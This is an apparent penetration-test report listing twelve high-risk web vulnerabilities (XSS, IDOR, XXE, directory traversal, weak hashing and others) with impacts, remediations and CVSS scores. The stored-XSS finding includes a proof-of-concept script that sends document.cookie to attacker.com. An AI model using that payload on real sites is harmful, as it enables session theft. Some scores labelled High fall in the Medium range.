````markdown
# High Risk Vulnerability Findings

---

## HIGH-001: Stored Cross-Site Scripting (XSS)

### Description
User-supplied input is stored without proper sanitization and rendered in the browser without encoding, allowing execution of malicious scripts.

### Location
- **Endpoint:** `/api/feedback`
- **Field:** `comment`

### Proof of Concept
```html
<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>
````

### Impact

* Session hijacking
* Account takeover
* Credential theft
* Malicious script execution in user browsers

### Remediation

* Sanitize and encode all user input
* Implement Content Security Policy (CSP)
* Use framework-provided output encoding

### CVSS Score: 7.2 (High)

---

## HIGH-002: Broken Access Control (IDOR)

### Description

Insecure Direct Object References allow users to access other users’ data by modifying object IDs.

### Location

* **Endpoint:** `/api/users/{id}`

### Impact

* Unauthorized data access
* Privacy violations
* Data leakage

### Remediation

* Enforce server-side authorization checks
* Validate object ownership
* Use indirect object references

### CVSS Score: 7.5 (High)

---

## HIGH-003: Weak Password Reset Token

### Description

Password reset tokens are predictable and do not expire, enabling account takeover.

### Location

* **Endpoint:** `/rest/user/reset-password`

### Impact

* Account takeover
* Unauthorized password changes

### Remediation

* Generate cryptographically secure tokens
* Set short token expiration
* Invalidate tokens after use

### CVSS Score: 7.3 (High)

---

## HIGH-004: Missing Rate Limiting

### Description

Critical endpoints lack rate limiting, allowing brute-force and automation attacks.

### Affected Endpoints

* `/rest/user/login`
* `/rest/user/reset-password`
* `/api/feedback`

### Impact

* Brute-force attacks
* Credential stuffing
* Denial of service

### Remediation

* Implement rate limiting at API gateway/WAF
* Enable CAPTCHA after failed attempts

### CVSS Score: 7.0 (High)

---

## HIGH-005: Session Fixation

### Description

Session IDs are not regenerated after successful authentication.

### Impact

* Session hijacking
* Account compromise

### Remediation

* Regenerate session IDs after login
* Invalidate old sessions

### CVSS Score: 6.8 (High)

---

## HIGH-006: XML External Entity (XXE) Injection

### Description

The XML parser processes external entities, allowing attackers to read internal files or trigger SSRF.

### Location

* **Endpoint:** `/api/upload/xml`

### Impact

* File disclosure
* Internal service access
* Denial of service

### Remediation

* Disable external entity processing
* Use secure XML parsers

### CVSS Score: 7.5 (High)

---

## HIGH-007: Insecure Direct Object Reference – Basket Access

### Description

Users can access other users’ shopping baskets by modifying basket IDs.

### Location

* **Endpoint:** `/rest/basket/{id}`

### Impact

* Data exposure
* Unauthorized actions

### Remediation

* Validate user ownership on server-side
* Implement RBAC checks

### CVSS Score: 6.5 (High)

---

## HIGH-008: API Key Exposure in Client-Side Code

### Description

Sensitive API keys are exposed in client-side JavaScript files.

### Location

* **File:** `/main.js`

### Impact

* Unauthorized API usage
* Abuse of backend services

### Remediation

* Remove secrets from client-side code
* Store secrets in AWS Secrets Manager / Azure Key Vault

### CVSS Score: 7.1 (High)

---

## HIGH-009: Credentials Sent via GET Request

### Description

User credentials are transmitted via URL parameters.

### Location

* **Endpoint:** `/rest/user/login`

### Impact

* Credential leakage via logs and browser history
* Account compromise

### Remediation

* Use POST requests for authentication
* Enforce HTTPS

### CVSS Score: 6.5 (High)

---

## HIGH-010: Directory Traversal

### Description

Improper file path validation allows access to files outside intended directories.

### Location

* **Endpoint:** `/ftp/files`

### Impact

* Sensitive file disclosure
* Configuration leakage

### Remediation

* Validate and sanitize file paths
* Restrict file system access

### CVSS Score: 7.5 (High)

---

## HIGH-011: Unvalidated Redirects

### Description

Application redirects users to untrusted external URLs based on user input.

### Location

* **Parameter:** `redirect_url`

### Impact

* Phishing attacks
* User trust exploitation

### Remediation

* Whitelist allowed redirect destinations
* Validate redirect parameters

### CVSS Score: 6.1 (High)

---

## HIGH-012: Weak Cryptographic Hashing

### Description

Passwords are hashed using weak cryptographic algorithms (MD5).

### Impact

* Password cracking
* Credential compromise

### Remediation

* Use bcrypt / Argon2 / PBKDF2
* Apply proper salting and iterations

### CVSS Score: 7.4 (High)

